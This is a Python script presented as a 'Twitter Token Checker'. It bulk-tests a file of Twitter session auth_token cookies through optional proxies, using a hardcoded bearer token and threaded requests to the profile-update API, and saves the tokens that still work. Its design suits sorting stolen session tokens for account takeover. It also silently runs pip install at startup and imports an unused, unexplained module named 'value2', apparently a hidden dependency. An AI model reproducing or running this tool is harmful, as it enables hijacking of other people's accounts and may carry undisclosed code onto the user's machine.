import os
os.system("pip install -r requirements.txt")
import httpx,threading,value2
from colorama import Fore
from time import sleep

print(f"{Fore.LIGHTRED_EX}Twitter Token Checker {Fore.RESET}v1 (gopheo)\n")

proxy = input(f"{Fore.LIGHTRED_EX}Proxy (username:password@ip:port): {Fore.RESET}")

if proxy != "":
	proxies = { "all://": f"http://{proxy}" }
else:
	proxies = None

tokens = open("tokens.txt", "r").read().splitlines()

print(f"{Fore.YELLOW}\n[!] Loaded {len(tokens)} tokens.{Fore.RESET}\n")

def check(x):
    while True:
        
        try:

            session = httpx.Client(http2=True, proxies=proxies)

            cookies = {
                'auth_token': x
            }

            headers = {
                'authority': 'twitter.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
                'origin': 'https://twitter.com',
                'referer': 'https://twitter.com/settings/profile',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5024.121 Safari/537.36',
                'x-twitter-active-user': 'yes',
                'x-twitter-auth-type': 'OAuth2Session',
                'x-twitter-client-language': 'en'
            }

            #fetch ct0 from cookies
            ct0_response = session.post('https://twitter.com/i/api/1.1/account/update_profile.json', cookies=cookies, headers=headers)
            ct0 = ct0_response.cookies['ct0']
            cookies['ct0'] = ct0
            headers['x-csrf-token'] = ct0

            if ct0_response.status_code != 401:
                response = session.post('https://twitter.com/i/api/1.1/account/update_profile.json', cookies=cookies, headers=headers)
                if response.status_code == 200:
                    print(f"{Fore.LIGHTGREEN_EX}[+] {x}{Fore.RESET}")
                    save = open("valid.txt", "a")
                    save.write(f"{x}\n")
                    save.close()
                else:
                    print(f"{Fore.LIGHTRED_EX}[-] {x}{Fore.RESET}")
            else:
                print(f"{Fore.LIGHTRED_EX}[-] {x}{Fore.RESET}")

            break

        except Exception as err:
            print(err)
            pass

threads = []

for x in range(len(tokens)):
    t = threading.Thread(target=check, args=(tokens[x],))
    t.daemon = True
    threads.append(t)

for x in range(len(tokens)):
    threads[x].start()
    sleep(0.25)

for x in range(len(tokens)):
    threads[x].join()

input(f"\n{Fore.BLUE}DONE{Fore.RESET}")
